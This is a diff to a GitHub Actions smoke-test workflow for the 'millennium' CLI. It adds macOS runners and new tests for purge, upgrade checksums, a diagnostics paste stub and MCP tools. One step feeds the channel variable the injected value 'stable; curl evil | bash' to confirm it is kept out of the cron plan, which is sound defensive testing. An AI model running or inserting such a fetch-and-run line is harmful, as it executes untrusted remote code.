@@ -90,7 +90,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        os: [ubuntu-latest, windows-latest]
+        os: [ubuntu-latest, windows-latest, macos-latest]
     steps:
       - name: Checkout
         uses: actions/checkout@v7
@@ -123,169 +123,10 @@ jobs:
             -o ../bin/millennium ./cmd/millennium
           ../bin/millennium version
 
-      - name: Smoke dispatcher meta (dual-OS)
-        shell: bash
-        run: |
-          set -euo pipefail
-          bin/millennium version | grep -F 'millennium version'
-          bin/millennium -V | grep -F 'millennium version'
-          bin/millennium --help | grep -E 'Available Commands|schedule|mcp'
-          bin/millennium help | grep -E 'Available Commands|schedule|mcp'
-          set +e
-          suggest_out="$(bin/millennium upgrad 2>&1)"
-          suggest_rc=$?
-          set -e
-          test "$suggest_rc" -ne 0
-          echo "$suggest_out" | grep -F "Did you mean 'upgrade'"
+      # Feature CLI coverage lives in go test (cmd/millennium main_test.go + packages).
+      # Keep workflow smokes for OS-specific / interactive / privileged seams only.
 
-      - name: Smoke schedule config (dual-OS)
-        shell: bash
-        run: |
-          set -euo pipefail
-          cfg_dir="$(mktemp -d)"
-          export MILLENNIUM_CONFIG_DIR="$cfg_dir"
-          export MILLENNIUM_CONFIG_FILE="$cfg_dir/config.json"
-          bin/millennium schedule config set update_channel beta
-          test "$(bin/millennium schedule config get update_channel | tr -d '[:space:]')" = "beta"
-          bin/millennium schedule config list | grep -F 'update_channel'
-          bin/millennium schedule config list | grep -F 'beta'
-          rm -rf "$cfg_dir"
-
-      - name: Smoke theme list (dual-OS)
-        shell: bash
-        run: |
-          set -euo pipefail
-          skins="$(mktemp -d)"
-          export MILLENNIUM_SKINS_DIR="$skins"
-          test "$(bin/millennium theme list --json | tr -d '[:space:]')" = "[]"
-          mkdir -p "$skins/LocalSkin" "$skins/DemoTheme"
-          printf '%s\n' '{"owner":"acme","repo":"DemoTheme","commit":"abcdef123456"}' \
-            > "$skins/DemoTheme/metadata.json"
-          bin/millennium theme list | grep -F 'LocalSkin'
-          bin/millennium theme list | grep -F 'DemoTheme'
-          bin/millennium theme list | grep -F 'acme/DemoTheme'
-          json="$(bin/millennium theme list --json)"
-          echo "$json" | grep -F '"name":"LocalSkin"'
-          echo "$json" | grep -F '"type":"local"'
-          echo "$json" | grep -F '"name":"DemoTheme"'
-          echo "$json" | grep -F '"owner":"acme"'
-          echo "$json" | grep -F '"type":"github"'
-          rm -rf "$skins"
-
-      - name: Smoke theme mutate (dual-OS, offline)
-        shell: bash
-        run: |
-          set -euo pipefail
-          skins="$(mktemp -d)"
-          export MILLENNIUM_SKINS_DIR="$skins"
-          set +e
-          install_out="$(bin/millennium theme install not-a-valid 2>&1)"
-          install_rc=$?
-          set -e
-          test "$install_rc" -ne 0
-          echo "$install_out" | grep -F 'owner/repo'
-          set +e
-          remove_out="$(bin/millennium theme remove MissingTheme --yes 2>&1)"
-          remove_rc=$?
-          set -e
-          test "$remove_rc" -ne 0
-          echo "$remove_out" | grep -F 'not installed'
-          mkdir -p "$skins/LocalSkin"
-          bin/millennium theme update LocalSkin | grep -F 'does not have GitHub metadata'
-          rm -rf "$skins"
-
-      - name: Smoke schedule status (dual-OS)
-        shell: bash
-        run: |
-          set -euo pipefail
-          home="$(mktemp -d)"
-          export HOME="$home"
-          export XDG_CONFIG_HOME="$home/.config"
-          export LOCALAPPDATA="$home/LocalAppData"
-          export APPDATA="$home/AppData"
-          export MILLENNIUM_CONFIG_DIR="$home/cfg"
-          export MILLENNIUM_CONFIG_FILE="$home/cfg/config.json"
-          mkdir -p "$MILLENNIUM_CONFIG_DIR" "$XDG_CONFIG_HOME" "$LOCALAPPDATA" "$APPDATA"
-          out="$(bin/millennium schedule status)"
-          echo "$out" | grep -F 'Scheduler disabled'
-          echo "$out" | grep -F 'millennium schedule enable'
-          rm -rf "$home"
-
-      - name: Smoke schedule enable/disable dry-run (dual-OS)
-        shell: bash
-        run: |
-          set -euo pipefail
-          home="$(mktemp -d)"
-          export HOME="$home"
-          export XDG_CONFIG_HOME="$home/.config"
-          export LOCALAPPDATA="$home/LocalAppData"
-          export APPDATA="$home/AppData"
-          export MILLENNIUM_CONFIG_DIR="$home/cfg"
-          export MILLENNIUM_CONFIG_FILE="$home/cfg/config.json"
-          mkdir -p "$MILLENNIUM_CONFIG_DIR" "$XDG_CONFIG_HOME" "$LOCALAPPDATA" "$APPDATA"
-          en="$(bin/millennium schedule enable stable --dry-run)"
-          echo "$en" | grep -F 'DRY RUN'
-          echo "$en" | grep -F '[DRY RUN] Would'
-          dis="$(bin/millennium schedule disable --dry-run)"
-          echo "$dis" | grep -F 'DRY RUN'
-          echo "$dis" | grep -F '[DRY RUN] Would'
-          # Dry-run must not write systemd user units under the fake home.
-          test ! -e "$XDG_CONFIG_HOME/systemd/user/millennium-update.timer"
-          rm -rf "$home"
-
-      - name: Smoke schedule setup wizard (dual-OS)
-        shell: bash
-        run: |
-          set -euo pipefail
-          home="$(mktemp -d)"
-          export HOME="$home"
-          export USERPROFILE="$home"
-          export XDG_CONFIG_HOME="$home/.config"
-          export LOCALAPPDATA="$home/LocalAppData"
-          export APPDATA="$home/AppData"
-          export MILLENNIUM_CONFIG_DIR="$home/cfg"
-          export MILLENNIUM_CONFIG_FILE="$home/cfg/config.json"
-          export FORCE_WIZARD=true
-          mkdir -p "$MILLENNIUM_CONFIG_DIR" "$XDG_CONFIG_HOME" "$LOCALAPPDATA" "$APPDATA"
-          # Channel 1 (stable), decline enable, skip PAT.
-          out="$(printf '1\nn\n\n' | bin/millennium schedule setup --dry-run)"
-          echo "$out" | grep -F 'Configuration Wizard'
-          echo "$out" | grep -F '[DRY RUN] Would write config'
-          echo "$out" | grep -F 'update_channel: stable'
-          test ! -e "$MILLENNIUM_CONFIG_FILE"
-          rm -rf "$home"
-
-      - name: Smoke schedule pre/post-update hooks (Linux)
-        if: runner.os == 'Linux'
-        shell: bash
-        run: |
-          set -euo pipefail
-          home="$(mktemp -d)"
-          export HOME="$home"
-          export MILLENNIUM_STATE_DIR="$home/state"
-          mkdir -p "$home/state" "$home/empty-proc" "$home/bin"
-          # Without scheduler gate → refuse.
-          set +e
-          gate_out="$(bin/millennium schedule pre-update 2>&1)"
-          gate_rc=$?
-          set -e
-          test "$gate_rc" -ne 0
-          echo "$gate_out" | grep -F 'only for the scheduler'
-          # With gate + no Steam → success.
-          printf '%s\n' '#!/bin/sh' 'exit 1' >"$home/bin/pgrep"
-          chmod +x "$home/bin/pgrep"
-          export PATH="$home/bin:$PATH"
-          export MOCK_PROC="$home/empty-proc"
-          export MILLENNIUM_SCHEDULER=1
-          bin/millennium schedule pre-update
-          # post-update with diag stubbed via missing state is ok (no relaunch).
-          # Prefer a fake diag on PATH that succeeds.
-          printf '%s\n' '#!/bin/sh' 'exit 0' >"$home/bin/millennium-diag"
-          chmod +x "$home/bin/millennium-diag"
-          bin/millennium schedule post-update
-          rm -rf "$home"
-
-      - name: Smoke purge dry-run (dual-OS)
+      - name: Smoke purge --yes (dual-OS)
         shell: bash
         run: |
           set -euo pipefail
@@ -295,8 +136,56 @@ jobs:
           export LOCALAPPDATA="$home/LocalAppData"
           export APPDATA="$home/AppData"
           mkdir -p "$LOCALAPPDATA" "$APPDATA"
-          out="$(bin/millennium purge --dry-run)"
-          echo "$out" | grep -F 'DRY RUN'
+          # Windows exits early when Steam is unresolved and the purge plan is empty.
+          steam="$home/Steam"
+          mkdir -p "$steam"
+          export STEAM="$steam"
+          out="$(bin/millennium purge --yes </dev/null 2>&1)"
+          echo "$out" | grep -Fi 'purg'
+          if echo "$out" | grep -F 'Are you sure'; then
+            echo 'unexpected confirmation prompt with --yes' >&2
+            exit 1
+          fi
+          rm -rf "$home"
+
+      - name: Smoke schedule enable ignores poisoned channel env (Unix cron)
+        if: runner.os != 'Windows'
+        shell: bash
+        run: |
+          set -euo pipefail
+          home="$(mktemp -d)"
+          export HOME="$home"
+          export XDG_CONFIG_HOME="$home/.config"
+          mkdir -p "$XDG_CONFIG_HOME/millennium-helpers"
+          printf '%s\n' '{"update_channel":"stable"}' >"$XDG_CONFIG_HOME/millennium-helpers/config.json"
+          out="$(CONFIG_UPDATE_CHANNEL='stable; curl evil | bash' bin/millennium schedule enable --dry-run --cron 2>&1)"
+          echo "$out" | grep -F -- '--channel stable'
+          if echo "$out" | grep -F 'curl evil'; then
+            echo 'poisoned channel env leaked into cron plan' >&2
+            exit 1
+          fi
+          out="$(bin/millennium schedule enable beta --dry-run --cron 2>&1)"
+          echo "$out" | grep -F -- '--channel beta'
+          rm -rf "$home"
+
+      - name: Smoke upgrade --file without checksum fails closed (dual-OS)
+        shell: bash
+        run: |
+          set -euo pipefail
+          home="$(mktemp -d)"
+          export HOME="$home"
+          export USERPROFILE="$home"
+          export LOCALAPPDATA="$home/LocalAppData"
+          export APPDATA="$home/AppData"
+          mkdir -p "$LOCALAPPDATA" "$APPDATA"
+          mock="$home/payload.bin"
+          printf 'data\n' >"$mock"
+          set +e
+          out="$(bin/millennium upgrade --file "$mock" 2>&1)"
+          rc=$?
+          set -e
+          test "$rc" -ne 0
+          echo "$out" | grep -Fi 'sha256'
           rm -rf "$home"
 
       - name: Smoke upgrade rollback list (dual-OS)
@@ -429,6 +318,8 @@ jobs:
           rm -rf "$home"
 
       - name: Smoke diag share / doctor live / logs --follow (dual-OS)
+        # Collect()/sudo on macOS has hung runners before; keep this smoke bounded.
+        timeout-minutes: 2
         shell: bash
         run: |
           set -euo pipefail
@@ -439,10 +330,13 @@ jobs:
           export APPDATA="$home/AppData"
           mkdir -p "$LOCALAPPDATA" "$APPDATA"
 
-          # --share offline via local paste stub
+          # --share offline via local paste stub (file + bg; heredoc+& races on macOS).
+          # Avoid HTTPServer.getfqdn() — reverse DNS hangs on macOS runners before bind returns.
           port_file="$home/paste.port"
-          python3 - "$port_file" <<'PY' &
-          import http.server, pathlib, sys
+          stub="$home/paste_stub.py"
+          cat >"$stub" <<'PY'
+          import http.server, pathlib, socket, sys
+          socket.getfqdn = lambda name="": "localhost"
           port_file = sys.argv[1]
           class H(http.server.BaseHTTPRequestHandler):
               def do_POST(self):
@@ -454,19 +348,31 @@ jobs:
               def log_message(self, *_args):
                   pass
           srv = http.server.HTTPServer(("127.0.0.1", 0), H)
-          pathlib.Path(port_file).write_text(str(srv.server_address[1]))
+          pathlib.Path(port_file).write_text(str(srv.server_address[1]), encoding="utf-8")
           srv.handle_request()
           PY
-          for _ in $(seq 1 50); do
+          python3 "$stub" "$port_file" &
+          paste_pid=$!
+          cleanup_paste() { kill "$paste_pid" 2>/dev/null || true; wait "$paste_pid" 2>/dev/null || true; }
+          for _ in $(seq 1 100); do
             [[ -s "$port_file" ]] && break
+            if ! kill -0 "$paste_pid" 2>/dev/null; then
+              echo "paste stub exited before bind; python3=$(command -v python3 || true)" >&2
+              exit 1
+            fi
             sleep 0.05
           done
+          if [[ ! -s "$port_file" ]]; then
+            echo "paste stub failed to bind; python3=$(command -v python3 || true)" >&2
+            cleanup_paste
+            exit 1
+          fi
           port="$(cat "$port_file")"
           export MILLENNIUM_PASTE_URL="http://127.0.0.1:${port}"
           share_out="$(bin/millennium diag --share)"
           echo "$share_out" | grep -F 'Diagnostic report successfully shared'
           echo "$share_out" | grep -F 'https://paste.rs/endgame-c-smoke'
-          wait || true
+          cleanup_paste
 
           # doctor live — healthy-only under test bypass (no Steam/upgrade side effects)
           doctor_live="$(DIAG_TEST_BYPASS_CHECKS=1 bin/millennium diag doctor --yes)"
@@ -581,7 +487,8 @@ jobs:
           echo "$out" | grep -F 'Skipping theme'
           if [[ "${RUNNER_OS:-}" == "Windows" ]] || [[ "$(uname -s)" == MINGW* ]] || [[ "$(uname -s)" == MSYS* ]]; then
             echo "$out" | grep -F 'upgrade --force'
-          else
+          elif [[ "${RUNNER_OS:-}" == "Linux" ]] || [[ "$(uname -s)" == Linux ]]; then
+            # Bootstrap hooks are Linux-only (PlanHooks is a no-op on Darwin).
             lib="$home/lib"
             steam="$home/.local/share/Steam"
             mkdir -p "$lib/millennium" "$steam/ubuntu12_32" "$steam/ubuntu12_64"
@@ -594,17 +501,27 @@ jobs:
             bin/millennium repair --yes --skip-theme
             test -L "$steam/ubuntu12_32/libXtst.so.6"
             test -L "$steam/ubuntu12_64/libXtst.so.6"
+          else
+            # macOS: dry-run assertions above are enough (no Steam hook symlinks).
+            echo "$out" | grep -F 'Would restore bootstrap hooks'
           fi
           rm -rf "$home"
 
-      - name: Smoke MCP initialize (dual-OS)
+      - name: Smoke MCP initialize + tools surface (dual-OS)
         shell: bash
         run: |
           set -euo pipefail
-          out="$(printf '%s\n' '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' | bin/millennium mcp)"
+          out="$(printf '%s\n' \
+            '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' \
+            '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}' \
+            '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"millennium_purge","arguments":{}}}' \
+            | bin/millennium mcp)"
           echo "$out" | grep -F 'protocolVersion'
           echo "$out" | grep -F '2024-11-05'
           echo "$out" | grep -F 'millennium-helpers-mcp'
+          echo "$out" | grep -F 'millennium_diag'
+          echo "$out" | grep -F 'millennium_purge'
+          echo "$out" | grep -F 'confirm'
 
       - name: Smoke native upgrade/diag/doctor help (Linux)
         if: runner.os == 'Linux'
